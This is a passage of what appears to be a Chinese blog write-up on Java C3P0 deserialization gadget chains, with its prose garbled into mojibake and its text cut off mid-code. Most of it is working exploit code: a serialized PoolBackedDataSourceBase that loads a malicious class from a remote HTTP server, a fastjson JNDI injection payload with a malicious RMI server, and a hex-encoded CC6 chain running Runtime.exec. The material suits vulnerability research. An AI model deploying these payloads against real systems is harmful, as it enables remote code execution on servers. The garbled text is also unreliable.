alt="image-20241101190429527"></p><p>è¿™é‡Œå…¶å®æœ‰ä¸¤ä¸ªindirectFormæ–¹æ³•çš„è°ƒç”¨ï¼Œä½†æ˜¯æˆ‘ä»¬é€‰æ‹©è¿™ä¸ªå‚æ•°ä¸ºConnectionPoolDataSourceçš„æ–¹æ³•</p><p>æˆ‘ä»¬å¯ä»¥çœ‹ä¸€ä¸‹ä»–èµ°åˆ°è¿™é‡Œçš„é€»è¾‘ï¼Œå¯ä»¥çœ‹åˆ°ä»–å…ˆå°è¯•åºåˆ—åŒ–ConnectionPoolDataSourceï¼Œå¦‚æœæŠ›å‡ºä¸èƒ½ååºåˆ—åŒ–çš„å¼‚å¸¸ï¼Œä»–å°±ä¼šè°ƒç”¨è¿™ä¸ªindirectFormæ–¹æ³•</p><p>æˆ‘ä»¬çœ‹ä¸€ä¸‹è¿™ä¸ªç±»</p><p><img src="https://cdn.clown2024.cn/image-20241101191307567.png" alt="image-20241101191307567"></p><p>å®ƒæœ¬èº«æ˜¯æ²¡æœ‰å®ç°åºåˆ—åŒ–æ¥å£çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬åªè¦æ‰¾ä¸€ä¸ªä»–çš„å®ç°ç±»ä¸”æ²¡æœ‰å®ç°åºåˆ—åŒ–æ¥å£å°±å¯ä»¥æŠ›å‡ºå¼‚å¸¸ï¼Œä»è€Œèµ°åˆ°indirectFormæ–¹æ³•çš„é€»è¾‘ï¼Œæˆ–è€…è‡ªå·±å®ç°è¿™ä¸ªæ¥å£ä¹Ÿå¯ä»¥</p><h3 id="åˆ©ç”¨é“¾æ„é€ "><a href="#åˆ©ç”¨é“¾æ„é€ " class="headerlink" title="åˆ©ç”¨é“¾æ„é€ "></a>åˆ©ç”¨é“¾æ„é€ </h3><p>é‚£ç°åœ¨æˆ‘ä»¬å°±å¯ä»¥è¿›è¡Œexpçš„ç¼–å†™äº†</p><p>è¿™é‡Œé‡‡ç”¨è‡ªå·±å®ç°ConnectionPoolDataSourceæ¥å£çš„æ–¹æ³•ï¼Œè€Œä¸”è¿™é‡Œæˆ‘ä»¬è¿˜éœ€è¦è‡ªå·±å®ç°ä¸€ä¸ªReferenceableæ¥å£ï¼Œå› ä¸ºindirectFormæ–¹æ³•é‡Œé¢ä¼ å…¥Referenceå¯¹è±¡çš„æ–¹å¼ä¸å¤ªä¸€æ ·</p><p><img src="https://cdn.clown2024.cn/image-20241101193611019.png" alt="image-20241101193611019"></p><p>è¿™é‡Œæ˜¯è°ƒç”¨ä¸€ä¸ªgetReferenceæ–¹æ³•æ¥è·å–Referenceå¯¹è±¡çš„</p><p>æœ€ç»ˆexpå¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.exp;<br><br><span class="hljs-keyword">import</span> com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;<br><br><span class="hljs-keyword">import</span> javax.naming.NamingException;<br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> javax.naming.Referenceable;<br><span class="hljs-keyword">import</span> javax.sql.ConnectionPoolDataSource;<br><span class="hljs-keyword">import</span> javax.sql.PooledConnection;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.sql.SQLException;<br><span class="hljs-keyword">import</span> java.sql.SQLFeatureNotSupportedException;<br><span class="hljs-keyword">import</span> java.util.logging.Logger;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">C3P0_URLClassloader</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EXP_Loader</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ConnectionPoolDataSource</span>, Referenceable&#123;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> Reference <span class="hljs-title function_">getReference</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> NamingException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;ExpClass&quot;</span>,<span class="hljs-string">&quot;exp&quot;</span>,<span class="hljs-string">&quot;http://127.0.0.1:8888/&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> PooledConnection <span class="hljs-title function_">getPooledConnection</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> PooledConnection <span class="hljs-title function_">getPooledConnection</span><span class="hljs-params">(String user, String password)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> PrintWriter <span class="hljs-title function_">getLogWriter</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setLogWriter</span><span class="hljs-params">(PrintWriter out)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br><br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setLoginTimeout</span><span class="hljs-params">(<span class="hljs-type">int</span> seconds)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br><br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getLoginTimeout</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> Logger <span class="hljs-title function_">getParentLogger</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLFeatureNotSupportedException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">//åºåˆ—åŒ–</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Pool_Serial</span><span class="hljs-params">(ConnectionPoolDataSource c)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException &#123;<br>        <span class="hljs-comment">//åå°„ä¿®æ”¹connectionPoolDataSourceå±æ€§å€¼ä¸ºæˆ‘ä»¬çš„æ¶æ„ConnectionPoolDataSourceç±»</span><br>        <span class="hljs-type">PoolBackedDataSourceBase</span> <span class="hljs-variable">poolBackedDataSourceBase</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PoolBackedDataSourceBase</span>(<span class="hljs-literal">false</span>);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">cls</span> <span class="hljs-operator">=</span> poolBackedDataSourceBase.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> cls.getDeclaredField(<span class="hljs-string">&quot;connectionPoolDataSource&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(poolBackedDataSourceBase,c);<br><br>        <span class="hljs-comment">//åºåˆ—åŒ–æµå†™å…¥æ–‡ä»¶</span><br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;exp.bin&quot;</span>));<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(fos);<br>        oos.writeObject(poolBackedDataSourceBase);<br><br>    &#125;<br><br>    <span class="hljs-comment">//ååºåˆ—åŒ–</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Pool_Deserial</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;exp.bin&quot;</span>));<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(fis);<br>        objectInputStream.readObject();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;<br>        <span class="hljs-type">EXP_Loader</span> <span class="hljs-variable">exp_loader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EXP_Loader</span>();<br>        Pool_Serial(exp_loader);<br>        Pool_Deserial();<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>æ¶æ„ç±»</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br> <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">exp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">exp</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç„¶åå»èµ·ä¸€ä¸ª8888ç«¯å£çš„æœåŠ¡å™¨ï¼Œæ¶æ„ç±»æ”¾åœ¨æœåŠ¡å™¨ä¸‹å³å¯</p><p><img src="https://cdn.clown2024.cn/image-20241101194419904.png" alt="image-20241101194419904"></p><h2 id="jndiæ³¨å…¥"><a href="#JNDIæ³¨å…¥" class="headerlink" title="JNDIæ³¨å…¥"></a>JNDIæ³¨å…¥</h2><p>è¯¥é“¾å­ä¾èµ–äºFastjsonå’ŒJacksonååºåˆ—åŒ–æ¼æ´</p><p><strong>åˆ©ç”¨é“¾</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#ä¿®æ”¹jndiName<br>JndiRefConnectionPoolDataSource#setJndiName -&gt;<br>JndiRefDataSourceBase#setJndiName<br> <br>#JNDIè°ƒç”¨<br>JndiRefConnectionPoolDataSource#setLoginTimeout -&gt;<br>WrapperConnectionPoolDataSource#setLoginTimeout -&gt;<br>JndiRefForwardingDataSource#setLoginTimeout -&gt;<br>JndiRefForwardingDataSource#inner -&gt;<br>JndiRefForwardingDataSource#dereference() -&gt;<br>Context#lookup<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°åˆ©ç”¨é“¾éƒ½æ˜¯ä»setteræ–¹æ³•å¼€å§‹çš„ï¼Œæ‰€ä»¥å°±å¯ä»¥å¾ˆå¥½é…åˆfastjsonæˆ–è€…Jacksonåˆ©ç”¨é“¾</p><h3 id="æµç¨‹åˆ†æ"><a href="#æµç¨‹åˆ†æ-1" class="headerlink" title="æµç¨‹åˆ†æ"></a>æµç¨‹åˆ†æ</h3><p>å…¶æ¼æ´ç‚¹åœ¨äºJndiRefConnectionPoolDataSourceç±»ä¸­ï¼Œè¯¥ç±»æœ‰è®¸å¤šçš„setterå’Œgetteræ–¹æ³•ï¼Œå…¶ä¸­æˆ‘ä»¬å¯ä»¥é€šè¿‡setJndiNameæ–¹æ³•æ¥ç»™å±æ€§jndiNameèµ‹å€¼</p><p><img src="https://cdn.clown2024.cn/image-20241102001706522.png" alt="image-20241102001706522"></p><p>ä»–è¿™é‡Œè°ƒç”¨JndiRefConnectionPoolDataSource#setJndiNameæ–¹æ³•çš„æ—¶å€™ï¼Œä¼šå†è·³åˆ°JndiRefDataSourceBase#setJndiNameæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241102001802528.png" alt="image-20241102001802528"></p><p>ä¿®æ”¹äº†nameä¹‹åæˆ‘ä»¬å°±éœ€è¦å»è§¦å‘è°ƒç”¨ï¼Œåˆ©ç”¨åˆ°çš„æ˜¯JndiRefConnectionPoolDataSource#setLoginTimeoutæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241102002128576.png" alt="image-20241102002128576"></p><p>ç„¶åè°ƒç”¨WrapperConnectionPoolDataSource#setLoginTimeoutæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241102002251962.png" alt="image-20241102002251962"></p><p>è¿™é‡Œçš„getNestedDataSourceè¿”å›çš„æ˜¯JndiRefForwardingDataSourceï¼Œå› æ­¤è¿™é‡Œè°ƒç”¨çš„æœ€ç»ˆæ˜¯<code>JndiRefForwardingDataSource#setLoginTimeout</code></p><p><img src="https://cdn.clown2024.cn/image-20241102002633572.png" alt="image-20241102002633572"></p><p>ç„¶åå°±æ˜¯è¿›å…¥inner()æ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241102002706468.png" alt="image-20241102002706468"></p><p>åœ¨dereference()æ–¹æ³•è§¦å‘äº†jndiè°ƒç”¨</p><p><img src="https://cdn.clown2024.cn/image-20241102002741246.png" alt="image-20241102002741246"></p><h3 id="åˆ©ç”¨é“¾æ„é€ "><a href="#åˆ©ç”¨é“¾æ„é€ -1" class="headerlink" title="åˆ©ç”¨é“¾æ„é€ "></a>åˆ©ç”¨é“¾æ„é€ </h3><p>é€‰ä¸ªä½ç‰ˆæœ¬çš„fastjsonæ¥åšä¾‹å­</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.exp;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">import</span> java.sql.SQLException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JNDI_Attack</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;@type\&quot;:\&quot;com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource\&quot;,&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;JndiName\&quot;:\&quot;rmi://127.0.0.1:1099/hello\&quot;, &quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;LoginTimeout\&quot;:0&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ¶æ„rmiæœåŠ¡</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.exp;<br><br><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> java.rmi.Naming;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMI_Server</span> &#123;<br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">register</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        <span class="hljs-type">Reference</span> <span class="hljs-variable">reference</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;exp&quot;</span>,<span class="hljs-string">&quot;exp&quot;</span>,<span class="hljs-string">&quot;http://127.0.0.1:8888/&quot;</span>);<br>        <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">refObjWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(reference);<br>        Naming.bind(<span class="hljs-string">&quot;rmi://127.0.0.1:1099/hello&quot;</span>,refObjWrapper);<br>        System.out.println(<span class="hljs-string">&quot;Registryè¿è¡Œä¸­......&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">RMI_Server</span>().register();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ¶æ„ç±»ç”¨å‰é¢è¿œç¨‹ç±»åŠ è½½çš„é‚£ä¸ª</p><p><img src="https://cdn.clown2024.cn/image-20241103003238269.png" alt="image-20241103003238269"></p><h2 id="åˆ©ç”¨hexæµåŠ è½½ä»»æ„ç±»"><a href="#åˆ©ç”¨HEXæµåŠ è½½ä»»æ„ç±»" class="headerlink" title="åˆ©ç”¨HEXæµåŠ è½½ä»»æ„ç±»"></a>åˆ©ç”¨HEXæµåŠ è½½ä»»æ„ç±»</h2><p>è¯¥åˆ©ç”¨é“¾èƒ½å¤Ÿååºåˆ—åŒ–ä¸€ä¸²åå…­è¿›åˆ¶å­—ç¬¦ä¸²</p><p><strong>åˆ©ç”¨é“¾</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#è®¾ç½®userOverridesAsStringå±æ€§å€¼<br>WrapperConnectionPoolDataSource#setuserOverridesAsString -&gt;<br>WrapperConnectionPoolDataSourceBase#setUserOverridesAsString<br> <br>#åˆå§‹åŒ–ç±»æ—¶ååºåˆ—åŒ–åå…­è¿›åˆ¶å­—èŠ‚æµ<br>WrapperConnectionPoolDataSource#WrapperConnectionPoolDataSource -&gt;<br>C3P0ImplUtils#parseUserOverridesAsString -&gt;<br>SerializableUtils#fromByteArray -&gt;<br>SerializableUtils#deserializeFromByteArray -&gt;<br>ObjectInputStream#readObject<br></code></pre></td></tr></table></figure><h3 id="æµç¨‹åˆ†æ"><a href="#æµç¨‹åˆ†æ-2" class="headerlink" title="æµç¨‹åˆ†æ"></a>æµç¨‹åˆ†æ</h3><p>è¯¥é“¾å­çš„æˆå› æ˜¯å› ä¸ºWrapperConnectionPoolDataSourceçš„æ„é€ æ–¹æ³•ä¸­å¯¹å±æ€§userOverridesçš„èµ‹å€¼å­˜åœ¨å¼‚æ ·å†™æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241103222535119.png" alt="image-20241103222535119"></p><p>è¿™é‡Œè°ƒç”¨C3P0ImplUtils#parseUserOverridesAsStringæ–¹æ³•å°†userOverridesè§£ææˆStringï¼Œä½†userOverridesæœ¬èº«å°±æ˜¯Stringç±»å‹ï¼Œæˆ‘ä»¬è·Ÿè¿›å»çœ‹çœ‹è¿™ä¸ªæ–¹æ³•åšäº†ä»€ä¹ˆ</p><p><img src="https://cdn.clown2024.cn/image-20241103223316471.png" alt="image-20241103223316471"></p><p>è¿™é‡Œä¼šå°†userOverridesçš„HASM_HEADERå˜é‡åé¢çš„åå…­è¿›åˆ¶å­—ç¬¦ä¸²æˆªå–å‡ºæ¥ï¼ŒHASM_HEADERçš„å€¼ä¸ºâ€HexAsciiSerializedMapâ€ï¼Œè¿˜ä¼šå°†æœ€åä¸€ä½ç»™å»æ‰ï¼Œæ‰€ä»¥æˆ‘ä»¬åé¢è®¾ç½®å˜é‡çš„å€¼çš„æ—¶å€™è¦åŠ ä¸Šè¿™ä¸ªå­—ç¬¦ä¸²ï¼Œè€Œä¸”æœ€åä¸€ä½åŠ ä¸Šå¤šä¸€ä¸ªå­—ç¬¦æ¯”å¦‚â€;â€æ¥å ä½</p><p>ç„¶åè§£æè¯¥åå…­è¿›åˆ¶å­—ç¬¦ä¸²ä¸ºå­—èŠ‚æ•°ç»„ï¼Œå¹¶è°ƒç”¨SerializableUtils#deserializeFromByteArrayæ–¹æ³•æ¥å¤„ç†å­—èŠ‚æ•°ç»„ï¼Œç»§ç»­è·Ÿè¿›å»çœ‹çœ‹</p><p><img src="https://cdn.clown2024.cn/image-20241103224452045.png" alt="image-20241103224452045"></p><p>æ¬¸çœ‹åˆ°è¿™ä¸ªæ–¹æ³•å°±å¾ˆç†Ÿæ‚‰ï¼Œå­—é¢æ„æ€å°±æ˜¯ååºåˆ—åŒ–è¯¥å­—èŠ‚æ•°ç»„ï¼Œå†è·Ÿè¿›å»</p><p><img src="https://cdn.clown2024.cn/image-20241103224710588.png" alt="image-20241103224710588"></p><p>å°±å¯ä»¥çœ‹åˆ°ç›´æ¥è°ƒç”¨äº†readObjectæ–¹æ³•</p><h3 id="åˆ©ç”¨é“¾æ„é€ "><a href="#åˆ©ç”¨é“¾æ„é€ -2" class="headerlink" title="åˆ©ç”¨é“¾æ„é€ "></a>åˆ©ç”¨é“¾æ„é€ </h3><p>ä¸Šé¢çš„åˆ©ç”¨é“¾æ„é€ å°±å¾ˆç®€å•äº†ï¼Œç›´æ¥ç”¨cc6çš„å­—èŠ‚ç æ¥åšç¤ºä¾‹</p><p>è¿™é‡Œå°±ç›´æ¥ç”¨çš„æ«å¸ˆå‚…çš„expï¼Œä½¿ç”¨çš„æ˜¯fastjsonæ¥è§¦å‘åˆ©ç”¨é“¾</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.exp;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.beans.PropertyVetoException;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.io.StringWriter;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Hex_Attack</span> &#123;<br><br>    <span class="hljs-comment">//CC6çš„åˆ©ç”¨é“¾</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Map <span class="hljs-title function_">CC6</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;<br>        <span class="hljs-comment">//ä½¿ç”¨InvokeTransformeråŒ…è£…ä¸€ä¸‹</span><br>        Transformer[] transformers=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        ChainedTransformer chainedTransformer=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        HashMap&lt;Object,Object&gt; hashMap1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        LazyMap lazyMap= (LazyMap) LazyMap.decorate(hashMap1,<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br><br>        TiedMapEntry tiedMapEntry=<span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap,<span class="hljs-string">&quot;abc&quot;</span>);<br>        HashMap&lt;Object,Object&gt; hashMap2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap2.put(tiedMapEntry,<span class="hljs-string">&quot;eee&quot;</span>);<br>        lazyMap.remove(<span class="hljs-string">&quot;abc&quot;</span>);<br><br><br>        <span class="hljs-comment">//åå°„ä¿®æ”¹LazyMapç±»çš„factoryå±æ€§</span><br>        Class clazz=LazyMap.class;<br>        Field factoryField= clazz.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        factoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        factoryField.set(lazyMap,chainedTransformer);<br><br>        <span class="hljs-keyword">return</span> hashMap2;<br>    &#125;<br><br><br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addHexAscii</span><span class="hljs-params">(<span class="hljs-type">byte</span> b, StringWriter sw)</span><br>    &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">ub</span> <span class="hljs-operator">=</span> b &amp; <span class="hljs-number">0xff</span>; <span class="hljs-comment">//è½¬æˆæ— ç¬¦å·æ•´æ•°</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">h1</span> <span class="hljs-operator">=</span> ub / <span class="hljs-number">16</span>;  <span class="hljs-comment">//è®¡ç®—é«˜ä½åå…­è¿›åˆ¶æ•°å­—</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">h2</span> <span class="hljs-operator">=</span> ub % <span class="hljs-number">16</span>;  <span class="hljs-comment">//è®¡ç®—åœ°ä½åå…­è¿›åˆ¶æ•°å­—</span><br>        sw.write(toHexDigit(h1)); <span class="hljs-comment">//è½¬æ¢æˆå­—ç¬¦ç„¶åå†™å…¥</span><br>        sw.write(toHexDigit(h2));<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">char</span> <span class="hljs-title function_">toHexDigit</span><span class="hljs-params">(<span class="hljs-type">int</span> h)</span><br>    &#123;<br>        <span class="hljs-comment">//é€ä¸ªå­—ç¬¦è¿›è¡Œè½¬æ¢</span><br>        <span class="hljs-type">char</span> out;<br>        <span class="hljs-keyword">if</span> (h &lt;= <span class="hljs-number">9</span>) out = (<span class="hljs-type">char</span>) (h + <span class="hljs-number">0x30</span>);<br>        <span class="hljs-keyword">else</span> out = (<span class="hljs-type">char</span>) (h + <span class="hljs-number">0x37</span>);<br>        <span class="hljs-comment">//System.err.println(h + &quot;: &quot; + out);</span><br>        <span class="hljs-keyword">return</span> out;<br>    &#125;<br><br>    <span class="hljs-comment">//å°†ç±»åºåˆ—åŒ–ä¸ºå­—èŠ‚æ•°ç»„</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] tobyteArray(Object o) <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bao</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(bao);<br>        oos.writeObject(o);<br>        <span class="hljs-keyword">return</span> bao.toByteArray();<br>    &#125;<br><br>    <span class="hljs-comment">//å­—èŠ‚æ•°ç»„è½¬åå…­è¿›åˆ¶</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">toHexAscii</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes)</span><br>    &#123;<br>        <span class="hljs-type">int</span> <span 